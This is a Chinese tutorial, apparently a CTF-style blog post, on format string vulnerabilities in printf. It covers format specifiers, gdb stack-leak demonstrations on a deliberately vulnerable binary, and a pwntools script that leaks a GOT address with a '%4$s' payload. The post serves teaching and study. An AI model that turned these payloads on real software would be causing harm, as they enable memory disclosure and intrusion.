---
title: 格式化字符串漏洞：基因工程
tags:
  - binary

---

## 渊源

> The format string function in c accepts a variable number of arguments. This feature can lead to that the number of arguments doesn't match the format string.  Moreover we can control the output by artificially inputting some illegal characters.	——Wozki·Soder

一个例子：

```c
char s[20] = “Hello world!\n”;
printf(“%s”, s);
```

偷个懒：

```c
char s[20] = “Hello world!\n”;
printf(s);
```

这样就引发了printf函数族的一个非常常见的设计缺陷。当第一个参数可以被控制的时候，我们可以控制它输出一些奇奇♂怪怪的东西。

```C
%[parameter][flags][field width][.precision][length]type
```

格式化字符串格式如上，

-  parameter
  - n$，获取格式化字符串中的指定参数
-  flag
- field width
  -  输出的最小宽度
-  precision
  -  输出的最大长度
-  length，输出的长度
  -  hh，输出一个字节
  -  h，输出一个双字节
-  type
  - d/i，有符号整数
  -  u，无符号整数
  -  x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  - o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  - s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
  - c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。
  - p， void * 型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", &a) 打印变量 a 所在的地址。
  - n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
  - %， '`%`'字面值，不接受任何 flags, width。

知道了格式化字符串的格式我们就可以愉快地利用它干点愉快的事情了。

## 格式化字符串漏洞

### 泄露

```c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

简单小程序说明一下。我们先编译它一下。

```
gcc -m32 -fno-stack-protector -no-pie -o fmtstr_1 fmtstr_1.c
```

马上出现了一个警告，警告我们出现了不安全的格式。

```
fmtstr_1.c: In function ‘main’:
fmtstr_1.c:7:9: warning: format not a string literal and no format arguments [-Wformat-security]      
  printf(s);
         ^
```

gdb调试，输入%08x.%08x.%08x，查看信息。

```
gef➤  b printf
Breakpoint 1 at 0x8048330
gef➤  r
Starting program: /home/abc/work/ctf/fmt/fmtstr_1 
%08x.%08x.%08x
```

```
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd38c│+0x0000: 0x080484ea  →  <main+100> add esp, 0x20      ← $esp
0xffffd390│+0x0004: 0x08048593  →  "%08x.%08x.%08x.%s"
0xffffd394│+0x0008: 0x00000001
0xffffd398│+0x000c: 0x22222222
0xffffd39c│+0x0010: 0xffffffff
0xffffd3a0│+0x0014: 0xffffd3b0  →  "%08x.%08x.%08x"
0xffffd3a4│+0x0018: 0xffffd3b0  →  "%08x.%08x.%08x"
0xffffd3a8│+0x001c: 0xf7fd0410  →  0x08048278  →  "GLIBC_2.0"
```

可以看到程序停在了第一个printf处，1,0x22222222,-1已经进栈了。

```
gef➤  c
Continuing.
00000001.22222222.ffffffff.%08x.%08x.%08x
```

来到第二个printf处，此时要执行`printf(s);`，由于我们输入的是格式化控制符，程序将要将接下来的几个地址打印出。

```
0xffffd39c│+0x0000: 0x080484f9  →  <main+115> add esp, 0x10      ← $esp
0xffffd3a0│+0x0004: 0xffffd3b0  →  "%08x.%08x.%08x"
0xffffd3a4│+0x0008: 0xffffd3b0  →  "%08x.%08x.%08x"
0xffffd3a8│+0x000c: 0xf7fd0410  →  0x08048278  →  "GLIBC_2.0"
0xffffd3ac│+0x0010: 0x0804849d  →  <main+23> add ebx, 0x1b63
0xffffd3b0│+0x0014: "%08x.%08x.%08x"
0xffffd3b4│+0x0018: ".%08x.%08x"
0xffffd3b8│+0x001c: "x.%08x"
```

```
gef➤  c
Continuing.
ffffd3b0.f7fd0410.0804849d
```

我们还可以这么输：`%3$x`

```
gef➤  r
Starting program: /home/abc/work/ctf/fmt/fmtstr_1
%3$x
gef➤  c
Continuing.
00000001.22222222.ffffffff.%3$x
stack:
0xffffd39c│+0x0000: 0x080484f9  →  <main+115> add esp, 0x10      ← $esp
0xffffd3a0│+0x0004: 0xffffd3b0  →  "%3$x"
0xffffd3a4│+0x0008: 0xffffd3b0  →  "%3$x"
0xffffd3a8│+0x000c: 0xf7fd0410  →  0x08048278  →  "GLIBC_2.0"
0xffffd3ac│+0x0010: 0x0804849d  →  <main+23> add ebx, 0x1b63
0xffffd3b0│+0x0014: "%3$x"
0xffffd3b4│+0x0018: 0x00000000
0xffffd3b8│+0x001c: 0xf7ffd940  →  0x00000000
```

%3$x的第三个参数为0x0804849d  ，因此可以输出

```
gef➤  c
Continuing.
804849d[Inferior 1 (process 16990) exited normally]
```

我们更进一步，把任意地址给读出来。下面用pwntools演示下怎么把got中的scanf读出来。

```python
from pwn import *
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print hex(__isoc99_scanf_got)
payload = p32(__isoc99_scanf_got) + '%4$s'
print payload
gdb.attach(sh,'b printf')
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print hex(u32(sh.recv()[4:8]))
sh.interactive()
```

```
$ python fmtstr_1.py 
[+] Starting local process './fmtstr_1': pid 18272
[*] '/home/abc/work/ctf/fmt/fmtstr_1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
0x804a014
\x14\x04%4$s
[*] running in new terminal: /usr/bin/gdb -q  "./fmtstr_1" 18272 -x "/tmp/pwnjVh711.gdb"
[+] Waiting for debugger: Done
0xf7e21bb0
[*] Switching to interactive mode
[*] Process './fmtstr_1' stopped with exit code 0 (pid 18272)
[*] Got EOF while reading in interactive
$ 
```

0xf7e21bb0这就是scanf在got中的位置了。